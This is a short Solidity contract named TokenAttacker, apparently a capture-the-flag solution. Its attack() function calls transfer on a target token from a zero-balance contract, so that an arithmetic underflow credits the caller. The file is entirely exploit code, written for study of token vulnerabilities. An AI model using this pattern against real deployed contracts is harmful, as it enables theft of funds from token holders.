// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint balance);
    function totalSupply() external view returns (uint);
}

contract TokenAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack(uint amount) external {
        IToken(challengeInstance).transfer(msg.sender, amount);
    }
}